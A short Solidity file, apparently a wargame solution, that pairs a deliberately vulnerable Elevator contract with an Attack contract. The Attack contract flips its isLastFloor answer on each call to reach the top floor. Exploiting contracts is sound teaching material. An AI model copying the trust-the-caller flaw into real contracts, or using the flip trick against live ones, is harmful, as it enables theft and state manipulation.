pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Attack {
    bool public isTop = true;
    // Elevator elevator;
    function isLastFloor(uint256) external returns (bool) {
        isTop = !isTop;
        return isTop;
    }

    function attack(address _elev) external {
        Elevator(_elev).goTo(12);
    }
}